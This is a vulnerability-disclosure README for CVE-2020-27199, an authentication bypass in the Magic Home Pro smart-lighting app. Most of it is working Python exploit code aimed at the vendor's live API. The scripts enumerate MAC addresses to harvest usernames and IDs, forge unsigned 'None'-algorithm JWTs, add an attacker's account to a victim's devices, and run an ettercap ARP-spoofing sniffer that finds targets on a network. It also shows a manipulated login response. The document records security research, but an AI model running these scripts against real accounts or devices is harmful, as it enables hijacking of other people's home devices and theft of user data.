# CVE-2020-27199 (Magic Home Pro - Authentication Bypass)

<p align="center">
  <img src="images/magicHomePro-Exploit.jpg" height="70%" width="70%"/>
</p>

Multiple vulnerabilities found in the Magic Home Pro Mobile Application which is used to interface with the [JadeHomic](https://www.amazon.com.au/s?me=A4PYNSFB834M3&marketplaceID=A39IBJ37TRP1C6) LED Strip RGB Kit.  The most significant of these vulnerabilities is an Authentication Bypass (CVE-2020-27199) vulnerability, which ultimately allows for full takeover and control of a victims' entire device group.

- The below details the enumeration steps which lead up to the final exploitation and PoC material used to enact the enumeration and final exploit.

## PoC Files

[magichome-forge.py](https://github.com/9lyph/CVE-2020-27199/blob/master/magichome-forge.py) - **JWT Forger, used to automate device takerover**

[magichome-sniffer.py](https://github.com/9lyph/CVE-2020-27199/blob/master/magichome-sniffer.py) - **Local network sniffer that searches the network for susceptible devices. Builds a list of devices for which attacks can be run against**

[magichome-switch.py](https://github.com/9lyph/CVE-2020-27199/blob/master/magichome-switch.py) - **Allows for the lighting up of devices**

[magichome-takeover.py](https://github.com/9lyph/CVE-2020-27199/blob/master/magichome-forge.py) - **Payload that allows for a successful takeover of a users account**

## Pre-Work to finding

- Rooted Android
- Root detection bypassed through patching, Re-signing of JAR and Rebuilding of APK (required)
- Certificate Pinning bypass [Frida to the rescue](https://frida.re/) (required)

#### Application

[Magic Home Pro](https://play.google.com/store/apps/details?id=com.zengge.wifi&hl=en)

#### Vendor of Product

[JadeHomic](https://www.amazon.com.au/s?me=A4PYNSFB834M3&marketplaceID=A39IBJ37TRP1C6)

#### WiFi Controller Product Owner

[Suzhou SmartChip Semiconductor Co.,Ltd](https://fccid.io/2AKCE)

#### Vendor Website

[JadeHomic](https://www.amazon.com.au/s?me=A4PYNSFB834M3&marketplaceID=A39IBJ37TRP1C6)

#### Reference(s)

[Mitre](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-27199)

[Exploit-db](https://www.exploit-db.com/exploits/49266)

[SpiderLabs Blog](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/magic-home-pro-mobile-application-authentication-bypass-cve-2020-27199/)

#### Affected Product Code Base

[Magic Home Pro](https://play.google.com/store/apps/details?id=com.zengge.wifi&hl=en)

### Description

##### Base URL: wifij01us.magichue.net

#### Enumeration

This vulnerability allows for any authenticated user to utilise their current authorization level to interrogate end points not apart of their registered products, using an API call to **/app/getBindedUserListByMacAddress/ZG001?macAddress=\<mac address\>**.  This results in a HTTP response that indicates the existence of the endpoint and returns the Username, User Unique Identifier (userUniID) and the Binded Unique ID (bindedUniID) of the associated endpoint.

Using the above interrogation, an attacker is then able to utilise an unauthorized POST request to API **/app/sendCommandBatch/ZG001**, using the newly enumerated mac address to send commands to the remote endpoint using compatible hex commands **71230fa3** and **71240fa4** resulting in ON and OFF respectively.

#### JWT forging based on the above gleaned details

After initial enumeration is complete, it is also possible to forge a JWT using the **userID** and **uniID** within the JWT payload data, in effect downgrading the token to use 'None' as the algorithm in the JWT header section (signature-bypass vulnerability).  Using this vulnerability the application is susceptible to device takeover by an attacker through use of the remote API call to **/app/shareDevice/ZG001** and utilising the **friendUserID** JSON parameter to add the device to the attackers device list, giving the attacker full control of the endpoint device.

Credit(s): 

- [Medium](https://medium.com/rangeforce/breaking-json-web-tokens-e11202452bfe)
- [JWT_TOOL - ticarpi](https://github.com/ticarpi/jwt_tool)


#### Vulnerability Type

- Authentication Bypass
- Information Disclosure
- Unauthorized Access
- Horizontal Privilege Escalation

#### Additional Information

##### OUI

The OUI describes the Organisation Unique Identifier for MAC Addresses registered to an organisation.  In the case of JadeHomic the magic OUI is **C8:2E:47**, where  the first three bytes corresponds to the manufacturer and the second 3 bytes correspond to the serial number assigned by the manufacturer. In our case the manufacturer identifier is registered to **Suzhou SmartChip Semiconductor Co., LTD**.

#### CVE Impact Other

Allows for an the authentication bypass of the Magic Home Pro Mobile application and thus full control of a victim users' entire device group.

#### Attack Vectors

- Authenticated user required 
- Succesful Enumeration of existing end system
- Subsequent sending of batch commands to an remote endpoint
- Device take over
- Authentication Bypass

#### PoC enumerator and batch command exploit

The proof of concept enumerates on the last bytes within the MAC range and returns findings.  It allows a test of the 'remote execute' if you are feeling daring.

```
import requests
import json
import os
from colorama import init
from colorama import Fore, Back, Style
import re

'''
1. First Stage Authentication
2. Second Stage Enumerate
3. Third Stage Remote Execute
'''

global found_macaddresses
found_macaddresses = []
global outtahere
outtahere = ""
q = "q"
global token


def turnOn(target, token):

    urlOn = "https://wifij01us.magichue.net/app/sendCommandBatch/ZG001"
    array = {
        "dataCommandItems":[
            {"hexData":"71230fa3","macAddress":target}
        ]
    }
    data = json.dumps(array)
    headersOn = {
        "User-Agent":"Magic Home/1.5.1(ANDROID,9,en-US)",
        "Accept-Language": "en-US",
        "Accept": "application/json", 
        "Content-Type": "application/json; charset=utf-8",
        "token":token,
        "Host": "wifij01us.magichue.net",
        "Connection": "close",
        "Accept-Encoding": "gzip, deflate"
    }
    print (Fore.WHITE + "[+] Sending Payload ...")
    response = requests.post(urlOn, data=data, headers=headersOn)
    if response.status_code == 200:
        if "true" in response.text:
            print (Fore.GREEN + "[*] Endpoint " + Style.RESET_ALL + f"{target}" + Fore.GREEN + " Switched On")
        else:
            print (Fore.RED + "[-] Failed to switch on Endpoint " + Style.RESET_ALL + f"{target}")

def turnOff(target, token):

    urlOff = "https://wifij01us.magichue.net/app/sendCommandBatch/ZG001"
    array = {
        "dataCommandItems":[
            {"hexData":"71240fa4","macAddress":target}
        ]
    }
    data = json.dumps(array)
    headersOff = {
        "User-Agent":"Magic Home/1.5.1(ANDROID,9,en-US)",
        "Accept-Language": "en-US",
        "Accept": "application/json", 
        "Content-Type": "application/json; charset=utf-8",
        "token":token,
        "Host": "wifij01us.magichue.net",
        "Connection": "close",
        "Accept-Encoding": "gzip, deflate"
    }
    print (Fore.WHITE + "[+] Sending Payload ...")
    response = requests.post(urlOff, data=data, headers=headersOff)
    if response.status_code == 200:
        if "true" in response.text:
            print (Fore.GREEN + "[*] Endpoint " + Style.RESET_ALL + f"{target}" + Fore.GREEN + " Switched Off")
        else:
            print (Fore.RED + "[-] Failed to switch on Endpoint " + Style.RESET_ALL + f"{target}")

def lighItUp(target, token):

    outtahere = ""
    q = "q"
    if len(str(target)) < 12:
        print (Fore.RED + "[!] Invalid target" + Style.RESET_ALL)
    elif re.match('[0-9a-f]{2}[0-9a-f]{2}[0-9a-f]{2}[0-9a-f]{2}[0-9a-f]{2}[0-9a-f]{2}$', target.lower()):
        while outtahere.lower() != q.lower():
            if outtahere == "0":
                turnOn(target, token)
            elif outtahere == "1":
                turnOff(target, token)
            outtahere = input(Fore.BLUE + "ON/OFF/QUIT ? (0/1/Q): " + Style.RESET_ALL)

def Main():
    urlAuth = "https://wifij01us.magichue.net/app/login/ZG001"

    data = {
        "userID":"<Valid Registered Email/Username>",
        "password":"<Valid Registered Password>",
        "clientID":""
    }

    headersAuth = {
        "User-Agent":"Magic Home/1.5.1(ANDROID,9,en-US)",
        "Accept-Language": "en-US",
        "Accept": "application/json", 
        "Content-Type": "application/json; charset=utf-8",
        "Host": "wifij01us.magichue.net",
        "Connection": "close",
        "Accept-Encoding": "gzip, deflate"
    }

    # First Stage Authenticate

    os.system('clear')
    print (Fore.WHITE + "[+] Authenticating ...")
    response = requests.post(urlAuth, json=data, headers=headersAuth)
    resJsonAuth = response.json()
    token = (resJsonAuth['token'])

    # Second Stage Enumerate

    print (Fore.WHITE + "[+] Enumerating ...")
    macbase = "C82E475DCE"
    macaddress = []
    a = ["%02d" % x for x in range(100)]
    for num in a:
        macaddress.append(macbase+num)

    with open('loot.txt', 'w') as f:
        for mac in macaddress:
            urlEnum = "https://wifij01us.magichue.net/app/getBindedUserListByMacAddress/ZG001"
            params = {
                "macAddress":mac
            }

            headersEnum = {
                "User-Agent": "Magic Home/1.5.1(ANDROID,9,en-US)",
                "Accept-Language": "en-US",
                "Content-Type": "application/json; charset=utf-8",
                "Accept": "application/json",
                "token": token,
                "Host": "wifij01us.magichue.net",
                "Connection": "close",
                "Accept-Encoding": "gzip, deflate"
            }

            response = requests.get(urlEnum, params=params, headers=headersEnum)
            resJsonEnum = response.json()
            data = (resJsonEnum['data'])
            if not data:
                pass
            elif data:
                found_macaddresses.append(mac)
                print (Fore.GREEN + "[*] MAC Address Identified: " + Style.RESET_ALL + f"{mac}" + Fore.GREEN + f", User: " + Style.RESET_ALL + f"{(data[0]['userName'])}, " + Fore.GREEN + "Unique ID: " + Style.RESET_ALL + f"{data[0]['userUniID']}, " + Fore.GREEN + "Binded ID: " + Style.RESET_ALL + f"{data[0]['bindedUniID']}")
                f.write(Fore.GREEN + "[*] MAC Address Identified: " + Style.RESET_ALL + f"{mac}" + Fore.GREEN + f", User: " + Style.RESET_ALL + f"{(data[0]['userName'])}, " + Fore.GREEN + "Unique ID: " + Style.RESET_ALL + f"{data[0]['userUniID']}, " + Fore.GREEN + "Binded ID: " + Style.RESET_ALL + f"{data[0]['bindedUniID']}\n")
            else:
                print (Fore.RED + "[-] No results found!")
                print(Style.RESET_ALL)

        if not found_macaddresses:
            print (Fore.RED + "[-] No MAC addresses retrieved")
        elif found_macaddresses:
            attackboolean = input(Fore.BLUE + "Would you like to Light It Up ? (y/N): " + Style.RESET_ALL)
            if (attackboolean.upper() == 'Y'):
                target = input(Fore.RED + "Enter a target device mac address: " + Style.RESET_ALL)
                lighItUp(target, token)
            elif (attackboolean.upper() == 'N'):
                print (Fore.CYAN + "Sometimes, belief isn’t about what we can see. It’s about what we can’t."+ Style.RESET_ALL)
            else:
                print (Fore.CYAN + "The human eye is a wonderful device. With a little effort, it can fail to see even the most glaring injustice." + Style.RESET_ALL)

if __name__ == "__main__":
    Main()
```

#### Enumeration

![](images/poc.jpg)

#### Token Forging

##### PoC token forger

- Using the **userID** and **uniqID** obtained upon successful enumeration. This PoC token forger, generates a new signed bypassed JWT

```
#!/usr/local/bin/python3

import url64
import requests
import json
import sys
import os
from colorama import init
from colorama import Fore, Back, Style
import re
import time
from wsgiref.handlers import format_date_time
from datetime import datetime
from time import mktime

now = datetime.now()
stamp = mktime(now.timetuple())

'''
HTTP/1.1 200
Server: nginx/1.10.3
Content-Type: application/json;charset=UTF-8
Connection: close

"{\"code\":0,\"msg\":\"\",\"data\":{\"webApi\":\"wifij01us.magichue.net/app\",\"webPathOta\":\"http:\/\/wifij01us.magichue.net\/app\/ota\/download\",\"tcpServerController\":\"TCP,8816,ra8816us02.magichue.net\",\"tcpServerBulb\":\"TCP,8815,ra8815us02.magichue.net\",\"tcpServerControllerOld\":\"TCP,8806,mhc8806us.magichue.net\",\"tcpServerBulbOld\":\"TCP,8805,mhb8805us.magichue.net\",\"sslMqttServer\":\"ssl:\/\/192.168.0.112:1883\",\"serverName\":\"Global\",\"serverCode\":\"US\",\"userName\":\"\",\"userEmail\":\"\",\"userUniID\":\"\"},\"token\":\"\"}"
'''

def Usage():
    print (f"Usage: {sys.argv[0]} <username> <unique id>")

def Main(user, uniqid):
    os.system('clear')
    print ("[+] Encoding ...")
    print ("[+] Bypass header created!")
    print ("HTTP/1.1 200")
    print ("Server: nginx/1.10.3")
    print ("Date: "+str(format_date_time(stamp))+"")
    print ("Content-Type: application/json;charset=UTF-8")
    print ("Connection: close\r\n\r\n")

    jwt_header = '{"typ": "JsonWebToken","alg": "None"}'
    jwt_data = '{"userID": "'+user+'", "uniID": "'+uniqid+'","cdpid": "ZG001","clientID": "","serverCode": "US","expireDate": 1618264850608,"refreshDate": 1613080850608,"loginDate": 1602712850608}'
    jwt_headerEncoded = url64.encode(jwt_header.strip())
    jwt_dataEncoded = url64.encode(jwt_data.strip())
    jwtcombined = (jwt_headerEncoded.strip()+"."+jwt_dataEncoded.strip()+".")
    print ("{\"code\":0,\"msg\":\"\",\"data\":{\"webApi\":\"wifij01us.magichue.net/app\",\"webPathOta\":\"http://wifij01us.magichue.net/app/ota/download\",\"tcpServerController\":\"TCP,8816,ra8816us02.magichue.net\",\"tcpServerBulb\":\"TCP,8815,ra8815us02.magichue.net\",\"tcpServerControllerOld\":\"TCP,8806,mhc8806us.magichue.net\",\"tcpServerBulbOld\":\"TCP,8805,mhb8805us.magichue.net\",\"sslMqttServer\":\"ssl:\/\/192.168.0.112:1883\",\"serverName\":\"Global\",\"serverCode\":\"US\",\"userName\":\""+user+"\",\"userEmail\":\""+user+"\",\"userUniID\":\""+uniqid+"\"},\"token\":\""+jwtcombined+"\"}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        Usage()
    else:
        Main(sys.argv[1], sys.argv[2])
```

#### Device Take Over

- Exploit to take over device which uses the attacker email (A registered account that will be used to takeover target account), target email (The account to be taken over), target mac address (associated to target email address) and forged token.

##### PoC device take over exploit

```
#!/usr/local/bin/python3

import url64
import requests
import json
import sys
import os
from colorama import init
from colorama import Fore, Back, Style
import re

def Usage():
    print (f"Usage: {sys.argv[0]} <attacker email> <target email> <target mac address> <target forged token>")

def Main():

    attacker_email = sys.argv[1]
    target_email = sys.argv[2]
    target_mac = sys.argv[3]
    forged_token = sys.argv[4]

    os.system('clear')
    print (Fore.WHITE + "[+] Sending Payload ...")
    url = "https://wifij01us.magichue.net/app/shareDevice/ZG001"

    array = {"friendUserID":attacker_email, "macAddress":target_mac}

    data = json.dumps(array)

    headers = {
        "User-Agent":"Magic Home/1.5.1(ANDROID,9,en-US)",
        "Accept-Language": "en-US",
        "Accept": "application/json", 
        "Content-Type": "application/json; charset=utf-8",
        "token":forged_token,
        "Host": "wifij01us.magichue.net",
        "Connection": "close",
        "Accept-Encoding": "gzip, deflate"
    }
    
    response = requests.post(url, data=data, headers=headers)
    if response.status_code == 200:
        if "true" in response.text:
            print (Fore.GREEN + "[*] Target is now yours ... " + Style.RESET_ALL)
        else:
            print (Fore.RED + "[-] Failed to take over target !" + Style.RESET_ALL)

if __name__ == "__main__":
    if len(sys.argv) < 5:
        Usage()
    else:
        Main()
```

##### Example successful POST request/response exchange

```
POST Request

POST /app/shareDevice/ZG001 HTTP/1.1
User-Agent: Magic Home/1.5.1(ANDROID,9,en-US)
Accept-Language: en-US
Accept: application/json
token: <forged token, representing the target victim>
Content-Type: application/json; charset=utf-8
Content-Length: 72
Host: wifij01us.magichue.net
Connection: close
Accept-Encoding: gzip, deflate

{"friendUserID":"<attackercontrolled email>","macAddress":"<victim mac address>"}

Response

HTTP/1.1 200 
Server: nginx/1.10.3
Date: Tue, 07 Jul 2020 05:31:33 GMT
Content-Type: application/json;charset=UTF-8
Connection: close
Content-Length: 31

{"code":0,"msg":"","data":true}
```

#### Magic Home Device Sniffer

- Requirements:
  - ettercap
  - Valid User Credentials
- Intention is to run this script aginst a network segment you are interested in finding susceptible devices on. 
- Once found run an attack using the attack menu within the script.

```
#!/usr/bin/env python3

import socket
import struct
import platform
import os
import sys
import requests
import json
from colorama import init
from colorama import Fore, Back, Style
import re
import time, subprocess

loot = []
global choice
choice = ''
global outtahere
outtahere = ""
q = "q"
global macAddress

def scan():
    with open('sniffedDevices.txt', 'a+') as f:
        os.system('clear')
        print (Fore.GREEN + "+=====================================+"+ Style.RESET_ALL )
        print (Fore.GREEN + "| Author: Victor Hanna (@9lyph)       |"+ Style.RESET_ALL )
        print (Fore.GREEN + "| Description: Magic Home Pro Sniffer |"+ Style.RESET_ALL )
        print (Fore.GREEN + "| (CTRL^C to Quit)                    |"+ Style.RESET_ALL )
        print (Fore.GREEN + "+=====================================+"+ Style.RESET_ALL )
        print (Fore.WHITE + '[+] Configuring IP Forwarding'+ Style.RESET_ALL )
        time.sleep(5)
        print (Fore.WHITE + '[+] Setting up MiTM'+ Style.RESET_ALL )
        time.sleep(2)
        ipForward = subprocess.Popen('sudo echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)
        time.sleep(2)
        ettercap = subprocess.Popen('sudo ettercap -T -q -i eth0 -M arp /<!--Update with valid gateway address-->// > /dev/null &', shell=True)
        time.sleep(2)
        print (Fore.WHITE + '[+] Searching for Magic Home Device(s)'+ Style.RESET_ALL )
        itsthere = []
        while (True):
            conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
            try:
                raw_data, addr = conn.recvfrom(65535)
                dst_mac, src_mac, proto, data = ethernet_frame(raw_data)
                if 'FF:FF:FF:FF:FF:FF' in dst_mac: # Suppress Broadcast traffic
                    pass
                elif 'c8:2e:47'.upper() in src_mac:
                    if src_mac in loot:
                        pass
                    else:
                        print (Fore.WHITE + '[+] Device ' + src_mac + ' added to loot !'+ Style.RESET_ALL)
                        loot.append(src_mac)
                        f.write(src_mac + "\n")
                elif 'c8:2e:47'.upper() in dst_mac:
                    if dst_mac in loot:
                        pass
                    else:
                        print (Fore.WHITE + '[+] Device ' + dst_mac + ' added to loot !'+ Style.RESET_ALL)
                        loot.append(dst_mac)
                        f.write(dst_mac + "\n")
                else:
                    pass
            except KeyboardInterrupt:
                print (Fore.WHITE + "[+] Stopping MiTM"+ Style.RESET_ALL)
                time.sleep(2)
                subprocess.Popen.kill(ettercap)
                print (Fore.WHITE + '[+] Reconfiguring IP Forwarding'+ Style.RESET_ALL)
                time.sleep(2)
                os.system('sudo echo 0 > /proc/sys/net/ipv4/ip_forward')
                menu()

def turnOn(target, token):
    urlOn = "https://wifij01us.magichue.net/app/sendCommandBatch/ZG001"
    array = {
        "dataCommandItems":[
            {"hexData":"71230fa3","macAddress":target}
        ]
    }

    data = json.dumps(array)

    headersOn = {
        "User-Agent":"Magic Home/1.5.1(ANDROID,9,en-US)",
        "Accept-Language": "en-US",
        "Accept": "application/json", 
        "Content-Type": "application/json; charset=utf-8",
        "token":token,
        "Host": "wifij01us.magichue.net",
        "Connection": "close",
        "Accept-Encoding": "gzip, deflate"
    }

    print (Fore.WHITE + "[+] Sending Payload ...")
    response = requests.post(urlOn, data=data, headers=headersOn)
    if response.status_code == 200:
        if "true" in response.text:
            print (Fore.GREEN + "[*] Endpoint " + Fore.WHITE + f"{target}" + Fore.GREEN + " Switched On" + Style.RESET_ALL)
        else:
            print (Fore.RED + "[-] Failed to switch on Endpoint " + Style.RESET_ALL + f"{target}")

def turnOff(target, token):
    urlOff = "https://wifij01us.magichue.net/app/sendCommandBatch/ZG001"

    array = {
        "dataCommandItems":[
            {"hexData":"71240fa4","macAddress":target}
        ]
    }

    data = json.dumps(array)
    headersOff = {
        "User-Agent":"Magic Home/1.5.1(ANDROID,9,en-US)",
        "Accept-Language": "en-US",
        "Accept": "application/json", 
        "Content-Type": "application/json; charset=utf-8",
        "token":token,
        "Host": "wifij01us.magichue.net",
        "Connection": "close",
        "Accept-Encoding": "gzip, deflate"
    }

    print (Fore.WHITE + "[+] Sending Payload ...")
    response = requests.post(urlOff, data=data, headers=headersOff)
    if response.status_code == 200:
        if "true" in response.text:
            print (Fore.GREEN + "[*] Endpoint " + Fore.WHITE + f"{target}" + Fore.GREEN + " Switched Off" + Style.RESET_ALL)
        else:
            print (Fore.RED + "[-] Failed to switch on Endpoint " + Style.RESET_ALL + f"{target}")

def lighItUp(target, token):
    outtahere = ""
    q = "q"
    if len(str(target)) < 12:
        print (Fore.RED + "[!] Invalid target" + Style.RESET_ALL)
    elif re.match('[0-9a-f]{2}[0-9a-f]{2}[0-9a-f]{2}[0-9a-f]{2}[0-9a-f]{2}[0-9a-f]{2}$', target.lower()):
        print (outtahere.lower())
        while outtahere.lower() != q.lower():
            if outtahere == "0":
                turnOn(target, token)
            elif outtahere == "1":
                turnOff(target, token)
            outtahere = input(Fore.GREEN + "ON/OFF/QUIT ? (0/1/Q): " + Style.RESET_ALL)
        menu()

def attack():
    with open('sniffedDevices.txt', 'rb') as f:
        os.system('clear')
        print (Fore.GREEN + "+=====================================+"+ Style.RESET_ALL)
        print (Fore.GREEN + "| Author: Victor Hanna (@9lyph)       |"+ Style.RESET_ALL)
        print (Fore.GREEN + "| Description: Magic Home Pro Sniffer |"+ Style.RESET_ALL)
        print (Fore.GREEN + "| Attack Device    : '1'              |"+ Style.RESET_ALL)
        print (Fore.GREEN + "| Exit to Main Menu: '2'              |"+ Style.RESET_ALL)
        print (Fore.GREEN + "| (CTRL^C to Quit)                    |"+ Style.RESET_ALL)
        print (Fore.GREEN + "+=====================================+"+ Style.RESET_ALL)
        print (Fore.WHITE + "[+] These are you available local targets:"+ Style.RESET_ALL)
        alreadyDone = []
        for target in f.readlines():
            macAddresses = ((target).replace(b":", b""))
            if macAddresses in alreadyDone:
                continue
            else:
                alreadyDone.append(macAddresses)
                print (target.replace(b":", b"").decode('utf-8').strip())

        choice = int(input ("Choice: "))
        if (choice == 1):
            macAddress = input("[+] Enter Device MAC (xxxxxxxxxxxx): ")
            urlAuth = "https://wifij01us.magichue.net/app/login/ZG001"

            data = {
                "userID":"<!--Valid Username-->",
                "password":"<!--Valid Password-->",
                "clientID":""
            }

            headersAuth = {
                "User-Agent":"Magic Home/1.5.1(ANDROID,9,en-US)",
                "Accept-Language": "en-US",
                "Accept": "application/json", 
                "Content-Type": "application/json; charset=utf-8",
                "Host": "wifij01us.magichue.net",
                "Connection": "close",
                "Accept-Encoding": "gzip, deflate"
            }
            print (Fore.WHITE + "[+] Authenticating ...")
            response = requests.post(urlAuth, json=data, headers=headersAuth)
            resJsonAuth = response.json()
            token = (resJsonAuth['token'])
            lighItUp(macAddress, token)
        elif (choice == 2):
            menu()
        else:
            attack()

def ethernet_frame(data):
    dst_mac, src_mac, proto = struct.unpack('!6s6sH', data[:14])
    return get_mac_addr(dst_mac), get_mac_addr(src_mac), socket.htons(proto), data[14:]

def get_mac_addr(bytes_addr):
    bytes_str = map('{:02x}'.format, bytes_addr)
    return ':'.join(bytes_str).upper()

def menu():
    os.system('clear')
    while (True):

        print (Fore.GREEN + "+=====================================+"+ Style.RESET_ALL)
        print (Fore.GREEN + "| Author: Victor Hanna (@9lyph)       |"+ Style.RESET_ALL)
        print (Fore.GREEN + "| Description: Magic Home Pro Sniffer |"+ Style.RESET_ALL)
        print (Fore.GREEN + "| Scan   : '1'                        |"+ Style.RESET_ALL)
        print (Fore.GREEN + "| Attack : '2'                        |"+ Style.RESET_ALL)
        print (Fore.GREEN + "| (CTRL^C to Quit)                    |"+ Style.RESET_ALL)
        print (Fore.GREEN + "+=====================================+"+ Style.RESET_ALL)
        try:
            choice = (input ("Choice: "))
            if (int(choice) == 1):
                scan()
            elif (int(choice) == 2):
                attack()
        except KeyboardInterrupt:
            os.system ('sudo echo 0 > /proc/sys/net/ipv4/ip_forward')
            print("\nBye bye !\n")
            sys.exit()

if __name__ == '__main__':
    menu()
```

### Authentication Bypass (Magic Home Pro) (CVE-2020-27199)
 
- Utilising the JSON token forgery coupled with the gleaned information i.e. the Victim Email, ClientID and UniqID based on the above enumeration it is possible to bypass the Mobile App authentication process through manipulating the HTTP response and thus gaining access to the Application as the victim.

- Attacker uses the Magic Home Pro application utilising a victim email address, arbitrary password and clientID

- The attacker can then manipulate the HTTP response using the details in step 1 which allows for the bypass to take place

```
Original HTTP Login Request via Magic Home Pro Mobile app
 
POST /app/login/ZG001 HTTP/1.1
User-Agent: Magic Home/1.5.1(ANDROID,9,en-US)
Accept-Language: en-US
Accept: application/json
token:
Content-Type: application/json; charset=utf-8
Content-Length: 117
Host: wifij01us.magichue.net
Connection: close
Accept-Encoding: gzip, deflate
 
{"userID":"<victim userID>","password":"<arbitrary password>","clientID":"<arbitrary ClientID>"}

Original HTTP Response
 
HTTP/1.1 200
Server: nginx/1.10.3
Date: Thu, 08 Oct 2020 00:08:45 GMT
Content-Type: application/json;charset=UTF-8
Connection: close
Content-Length: 37
 
{"code":10033,"msg":"Password error"}

Edited HTTP Response
 
HTTP/1.1 200
Server: nginx/1.10.3
Date: Mon, 06 Jul 2020 12:32:02 GMT
Content-Type: application/json;charset=UTF-8
Connection: close
Content-Length: 907
 
{"code":0,"msg":"","data":{"webApi":"wifij01us.magichue.net/app","webPathOta":"http://wifij01us.magichue.net/app/ota/download","tcpServerController":"TCP,8816,ra8816us02.magichue.net","tcpServerBulb":"TCP,8815,ra8815us02.magichue.net","tcpServerControllerOld":"TCP,8806,mhc8806us.magichue.net","tcpServerBulbOld":"TCP,8805,mhb8805us.magichue.net","sslMqttServer":"ssl://192.168.0.112:1883","serverName":"Global","serverCode":"US","userName":"<victim userID>","userEmail":"<victim email>","userUniID":"<uniID gleaned from enumeration>"},"token":"<forged JWT based on gleaned data from API call>"}
```

#### Video Exploit PoC
[![Magic Home PRO - Exploit](https://yt-embed.herokuapp.com/embed?v=rSiwV9s3caY)](https://youtu.be/2d01JTAiTj4)

#### Discoverer/Credit: 
Victor Hanna of Trustwave SpiderLabs

#### Follow me on
<a rel="me" href="https://defcon.social/@9lyph">Mastodon</a> [Linkedin](https://www.linkedin.com/in/victor-h-a894a84/) [Youtube](https://www.youtube.com/channel/UC79Q2b0tHeqsjjvEH0k7jZw)
